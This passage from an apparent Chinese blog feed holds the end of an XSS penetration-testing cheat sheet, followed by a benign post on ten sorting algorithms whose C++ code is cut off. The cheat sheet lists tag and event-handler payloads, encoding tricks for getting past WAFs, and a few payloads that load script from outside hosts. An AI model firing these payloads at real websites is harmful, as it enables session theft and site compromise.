onerror=alert(1)&gt; &lt;img src=&quot;x:kcf&quot; onerror=&quot;alert(1)&quot;&gt;</code></pre></li></ul></li><li><p>body标签</p><p>通过event事件来调用js</p><pre class="line-numbers language-Html"><code class="language-Html"><body onload=alert(1)> <body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>var标签</p><pre><code>&lt;var onmouseover=&quot;prompt(1)&quot;&gt;M&lt;/var&gt;</code></pre></li><li><p>div标签</p><pre><code>&lt;div/onmouseover=&#39;alert(1)&#39;&gt;X&lt;div style=&quot;position:absolute;top:0;left:0;width:100%;height:100%&quot; onclick=&quot;alert(52)&quot;&gt;</code></pre></li><li><p>iframe标签</p><p>有时候我们可以通过实体编码、换行和Tab字符来bypass。我们还可以通过事先在swf文件中插入我们的xss code，然后通过src属性来调用。不过关于flash，只有在crossdomain.xml文件中，allow-access-from domain=”*“允许从外部调用swf时，才可以通过flash来事先xss attack。</p><p>下面的<code>&amp;Tab;</code>为tab字符</p><pre><code>&lt;iframe  src=j&amp;Tab;a&amp;Tab;v&amp;Tab;a&amp;Tab;s&amp;Tab;c&amp;Tab;r&amp;Tab;i&amp;Tab;p&amp;Tab;t&amp;Tab;:a&amp;Tab;l&amp;Tab;e&amp;Tab;r&amp;Tab;t&amp;Tab;%28&amp;Tab;1&amp;Tab;%29&gt;&lt;/iframe&gt; </code></pre><pre><code>&lt;iframe SRC=&quot;http://0x.lv/xss.swf&quot;&gt;&lt;/iframe&gt; </code></pre><pre><code>&lt;IFRAME SRC=&quot;javascript:alert(1);&quot;&gt;&lt;/IFRAME&gt; </code></pre><pre class="line-numbers language-Html"><code class="language-Html"><iframe/onload=alert(1)></iframe><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>meta标签</p></li></ol><p>测试时发现昵称，文章标题跑到meta标签中，那么只需要跳出当前属性再添加<code>http-equiv=&quot;refresh&quot;</code>，就可以构造一个有效地xss payload。还有一些猥琐的思路，就是通过给<code>http-equiv</code>设置<code>set-cookie</code>，进一步重新设置cookie来干一些猥琐的事情。</p><pre class="line-numbers language-Html"><code class="language-Html">  <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>  <meta http-equiv="refresh" content="0; url=data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>object标签</p><p>和a标签的href属性的玩法是一样的，优点是无需交互。</p><pre class="line-numbers language-Html"><code class="language-Html"><object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=></object><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>marquee标签</p><pre class="line-numbers language-Html"><code class="language-Html"><marquee onstart="alert('1')"></marquee><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>isindex标签</p><p>在一些只针对属性做了过滤的webapp中，action很有可能是漏网之鱼。</p><pre><code>&lt;isindex type=image src=1 onerror=alert(1)&gt; </code></pre><pre><code>&lt;isindex action=javascript:alert(1) type=image&gt;</code></pre></li><li><p>input标签</p><p>通过event来调用js。和button一样通过autofocus可以达到无需交互即可弹窗的效果。</p><pre><code>&lt;input onfocus=javascript:alert(1) autofocus&gt; &lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;</code></pre></li><li><p>select标签</p><pre class="line-numbers language-Html"><code class="language-Html"><select onfocus=javascript:alert(1) autofocus><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>textarea标签</p><pre class="line-numbers language-Html"><code class="language-Html"><textarea onfocus=javascript:alert(1) autofocus><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>keygen标签</p><pre><code>&lt;keygen onfocus=javascript:alert(1) autofocus&gt;</code></pre></li><li><p>frameset标签</p><pre><code>&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(1);&quot;&gt;&lt;/FRAMESET&gt; </code></pre></li><li><p>embed标签</p><pre><code>&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt; //chrome </code></pre><pre><code>&lt;embed src=javascript:alert(1)&gt; //firefox</code></pre></li><li><p>svg标签</p><pre><code>&lt;svg onload=&quot;javascript:alert(1)&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;/svg&gt;</code></pre><pre><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;&lt;g onload=&quot;javascript:alert(1)&quot;&gt;&lt;/g&gt;&lt;/svg&gt;  //chrome有效</code></pre></li><li><p>math标签</p><pre><code>&lt;math href=&quot;javascript:javascript:alert(1)&quot;&gt;CLICKME&lt;/math&gt; &lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 &lt;math&gt; &lt;maction actiontype=&quot;statusline#http://wangnima.com&quot; xlink:href=&quot;javascript:alert(49)&quot;&gt;CLICKME </code></pre></li><li><p>video标签</p><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt; &lt;video src=x onerror=alert(48)&gt;</code></pre></li></ol><ol start="13"><li><p>audio标签</p><pre><code>&lt;audio src=x onerror=alert(47)&gt;</code></pre></li><li><p>background属性</p><pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; // 在Opera 10.5和IE6上有效</code></pre></li></ol><ol start="15"><li><p>poster属性</p><pre><code>&lt;video poster=javascript:alert(1)//&gt;&lt;/video&gt; // Opera 10.5以下有效</code></pre></li><li><p>code属性</p><pre><code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效</code></pre><pre><code>embed code=&quot;http://businessinfo.co.uk/labs/xss/xss.swf&quot; allowscriptaccess=always&gt;</code></pre></li><li><p>expression属性</p><pre><code>&lt;img style=&quot;xss:expression(alert(0))&quot;&gt; // IE7以下&lt;div style=&quot;color:rgb(&#39;&#39;&amp;#0;x:expression(alert(1))&quot;&gt;&lt;/div&gt; // IE7以下&lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</code></pre></li></ol><h2 id="0x02-一些过waf技巧"><a href="#0x02-一些过waf技巧" class="headerlink" title="0x02 一些过waf技巧"></a>0x02 一些过waf技巧</h2><ul><li><p>单次过滤规则绕过：有些规则仅进行一次过滤替换，可以通过双重复写绕过<code>&lt;scr&lt;script&gt;ipt&gt;</code></p></li><li><p>大小写绕过：<code>&lt;sCript&gt;</code></p></li><li><p>alert被过滤，可以尝试prompt和confirm</p></li><li><p>没有引号和分号：<code>&lt;IMG SRC=javascript:alert(&#39;XSS&#39;)&gt;</code></p></li><li><p>空格被过滤：<code>&lt;img/src=&quot;&quot;onerror=alert(2)&gt; &lt;svg/onload=alert(2)&gt;&lt;/svg&gt;</code></p></li><li><p>反引号妙用：</p></li><li><p>长度限制时： <code>&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效</code></p></li><li><p>单引号及双引号被过滤情况: <code>&lt;script&gt;alert(/jdq/)&lt;/script&gt; //用双引号会把引号内的内容单独作为内容 用斜杠，则会连斜杠一起回显</code></p></li><li><p>javascript伪协议</p><pre><code>&lt;a href=&quot;javascript:alert(/test/)&quot;&gt;xss&lt;/a&gt;&lt;iframe src=javascript:alert(&#39;xss&#39;);height=0 width=0 /&gt;&lt;iframe&gt;利用iframe框架标签</code></pre></li><li><p>畸形payload：<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code></p></li><li><p>/的妙用：<code>&lt;script&gt;alert(/3/)&lt;/script&gt;</code></p></li><li><p>括号被过滤,可以使用throw来抛出数据</p><p>以上两个测试向量在 Chrome 和 IE 上会出现一个 “uncaught” 错误，可以用下面的向量代替（下面向量在FireFox上测试失败）</p><p><code>&lt;body/onload=javascript:window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&gt;</code></p></li><li><p>当=();:被过滤时:<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code>opera 中可以不闭合 <code>&lt;svg&gt;&lt;script&gt;alert&amp;#40 1&amp;#41</code> // Opera可查</p></li><li><p>过滤某些关键字（如：javascript） 可以在属性中的引号内容中使用空字符、空格、TAB换行、注释、特殊的函数，将代码行隔开。比如在使用<code>&lt;iframe src=&quot;javascript:alert(1253)&quot; height=0 width=0 /&gt;&lt;iframe&gt;</code>时，可以用回车、Tab键将src中的内容隔开，回车的url编码为%0a,%0b; 拼凑法：① 双写绕过；② 使用js定义变量z=scri, z+pt=script; ③ 两处输出点<code>&lt;scri&lt;!-- 第二处--&gt;pt&gt;</code>;</p></li><li><p>无法使用href:</p><pre><code>&lt;a onmouseover=&quot;alert(document.cookie)&quot;&gt;xxs link&lt;/a&gt;在chrome下，其回补全缺失的引号。因此，也可以这样写：&lt;a onmouseover=alert(document.cookie)&gt;xxs link&lt;/a&gt;</code></pre><ul><li><p>解决限制字符(要求同页面)</p><pre><code>&lt;script&gt;z=’document.’&lt;/script&gt; &lt;script&gt;z=z+’write(“‘&lt;/script&gt; &lt;script&gt;z=z+’&lt;script’&lt;/script&gt; &lt;script&gt;z=z+’ src=ht’&lt;/script&gt; &lt;script&gt;z=z+’tp://ww’&lt;/script&gt;&lt;script&gt;z=z+’w.shell’&lt;/script&gt; &lt;script&gt;z=z+’.net/1.’&lt;/script&gt; &lt;script&gt;z=z+’js&gt;&lt;/sc’&lt;/script&gt;&lt;script&gt;z=z+’ript&gt;”)’&lt;/script&gt; &lt;script&gt;eval_r(z)&lt;/script&gt;</code></pre></li></ul></li></ul><ul><li><p>编码：</p><ul><li><p>JS函数（如eval，settimeout）还有就是<code>href= action= formaction= location= on*= name= background= poster= src= code=</code>这些地方，可以配合编码。此外，data属性可以base64编码。</p><ol><li><p>js16进制</p><pre><code>&lt;script&gt;eval(“js+16进制加密”)&lt;/script&gt; &lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29&quot;)&lt;/script&gt; 编码要执行的语句↓Alert(“xss”)</code></pre></li><li><p>js unicode</p><pre><code>&lt;script&gt;eval(&quot;unicode加密&quot;)&lt;/script&gt; //js unicode加密 解决alert()被过滤&lt;script&gt;eval(&quot;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029&quot;)&lt;/script&gt;</code></pre></li><li><p>String.fromCharCode函数（不需要任何引号，必须函数内）</p><pre><code>&lt;script&gt;eval(String.fromCharCode编码内容))&lt;/script&gt; &lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))&lt;/script&gt;</code></pre></li><li><p>jsfuck版本</p><pre><code>&lt;script&gt;alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])&lt;/script&gt;</code></pre></li><li><p>HTML编码：</p><pre><code>    &lt;img src=&#39;1&#39; onerror=&#39;aler&amp;#x0074;(1)&#39;&gt;</code></pre></li><li><p>base64编码（仅data支持）</p><pre><code>     &lt;object data=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3QuY24vUnE5bjZ6dT48L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;     格式：     Data:&lt;mime type&gt;,&lt;encoded data&gt;     Data //协议     &lt;mime type&gt; //数据类型     charset=&lt;charset&gt;  //指定编码     [;base64] //被指定的编码     &lt;encoded data&gt; //定义data协议的编码     特点：不支持IE</code></pre></li></ol></li></ul></li></ul><ul><li><p>存在json数据解析 context： <code>&lt;?=json_encode($_GET[&#39;x&#39;])?&gt;</code> payload： <code>?x=&lt;img+src=x+onerror=ö-alert(1)&gt;</code></p></li><li><p>SVG 标签</p><p>当返回结果在 svg 标签中的时候，会有一个特性 <code>&lt;svg&gt;&lt;script&gt;varmyvar=&quot;YourInput&quot;;&lt;/script&gt;&lt;/svg&gt;</code> YourInput 可控，输入 <code>www.site.com/test.php?var=text&quot;;alert(1)//</code> 如果把 “ 编码一些他仍然能够执行: <code>&lt;svg&gt;&lt;script&gt;varmyvar=&quot;text&amp;quot;;alert(1)//&quot;;&lt;/script&gt;&lt;/svg&gt;</code></p></li></ul><p>##</p><h2 id="0x03-其它知识"><a href="#0x03-其它知识" class="headerlink" title="0x03 其它知识"></a>0x03 其它知识</h2><h3 id="浏览器解析规则"><a href="#浏览器解析规则" class="headerlink" title="浏览器解析规则"></a>浏览器解析规则</h3><p><strong>URL编码：</strong></p><p>一个百分号和该字符的ASCII编码所对应的2位十六进制数字，例如“/”的URL编码为%2F(一般大写，但不强求)</p><p><strong>HTML实体编码：</strong></p><ul><li>命名实体：以&amp;开头，分号结尾的，例如“&lt;”的编码是“&lt;”</li><li>字符编码：十进制、十六进制ASCII码或unicode字符编码，样式为“&amp;#数值;”,例如“&lt;”可以编码为“&lt;”和“&lt;”</li></ul><p><strong>JS编码：</strong>js提供了四种字符编码的策略</p><pre><code>1、三个八进制数字，如果不够个数，前面补0，例如“e”编码为“\145”2、两个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\x65”3、四个十六进制数字，如果不够个数，前面补0，例如“e”编码为“\u0065”4、对于一些控制字符，使用特殊的C类型的转义风格（例如\n和\r）5、jsfuck编码</code></pre><p><strong>CSS编码：</strong>用一个反斜线()后面跟1~6位的十六进制数字，例如e可以编码为“\65”或“65”或“00065”</p><p>HTML解析器能识别在文本节点和参数值里的实体编码，并在内存里创建文档树的表现形式时，透明的对这些编码进行解码</p><p>浏览器的解析规则：浏览器收到HTML内容后，会从头开始解析。当遇到JS代码时，会使用JS解析器解析。当遇到URL时，会使用URL解析器解析。遇到CSS则用CSS解析器解析。尤其当遇到复杂代码时，可能该段代码会经过多个解析器解析。</p><p>比如：<code>&lt;a href=&quot;javascript:window.open(&#39;http://www.baidu.com&#39;)&quot;&gt;test&lt;/a&gt;</code></p><p>这段代码，HTML解析器首先工作（注：此时，若href=”字符串”中的字符串存在字符引用，会对其解码）。然后URL解析器开始对href值进行URL解析。进行URL解析时，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。即，javascript:是不能进行任何js编码的。解析了javascript：之后，会由JS解析器进行解析。JS解析器针对一些编码，其只有在标志符名称里的编码字符才能够被正常的解析。解析完window.open以后，又会由URL解析器进行解析。想了解各解析器的特性，可参考这篇文章<a href="http://bobao.360.cn/learning/detail/292.html" target="_blank" rel="noopener">深入理解浏览器解析机制和XSS向量编码</a></p><p>JS解析器不会解析和解码字符引用，而针对JS的一些编码其会视情况而定。</p><p>可以看到，该代码经过了HTML-&gt;URL-&gt;JS-&gt;URL 四重解析。由于不同的解析器能够分别对一些编码格式进行解析，所以我们可以通过生成特定格式的编码代码，令其在依次解码后能够正确执行，从而绕过WAF。</p><p>如：</p><pre class="line-numbers language-HTML"><code class="language-HTML"><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">test</a><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该代码能够正确执行。</p><p>首先，经过HTML解析之后，代码会变成</p><pre><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt;</code></pre><p>此时，由于javascript已经生成，不违反URL解析规则。所以，URL解析正常。解析了javascript，最终进入JS解析器。注意，URL解析器还完成了URL解码工作。</p><pre><code>&lt;a href=&quot;javascript:alert(2)&quot;&gt;test&lt;/a&gt;</code></pre><p>所以，JS最终解析的代码时alert(2).成功执行。</p><p>总结来说，各种编码在XSS中的利用非常灵活，我们需要在充分了解浏览器的解析原理合理构造合理编码顺序的代码，最终构造出Payload。</p>]]></content>
      
      
      <categories>
          
          <category> xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总（附代码）</title>
      <link href="/2020/02/16/sort-algorithms/"/>
      <url>/2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>本文并不会详细讲解每种排序算法的原理</strong>，网上有很多很好的教程，大家可以自己去搜了看。</p><p>最后我还亲自手写了十种排序算法的 c++ 代码，大家可以用来通过 <a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组" target="_blank" rel="noopener">LeetCode 912. 排序数组</a> 这道题。</p><h2 id="性质汇总"><a href="#性质汇总" class="headerlink" title="性质汇总"></a>性质汇总</h2><blockquote><p>如果发现表中有错误，请留言告知。</p></blockquote><table><thead><tr><th>算法</th><th>最好</th><th>最坏</th><th>平均</th><th>空间</th><th align="center">稳定性</th><th align="center">是否基于比较</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>插入排序</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>快速排序</td><td>$O(n\log n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>归并排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>希尔排序</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>基数排序</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>桶排序</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>堆排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>如果表格显示有问题的话，还可以直接看下面的汇总图：</p></blockquote><p><img src="1.png" alt="十大经典排序算法性质汇总"></p><h3 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h3><p>我觉得还是英文维基百科讲的比较详细、严谨。如果大家看的比较累的话，可以自己百度搜索相应的教程。</p><p><strong>冒泡排序</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>选择排序</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>插入排序</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token 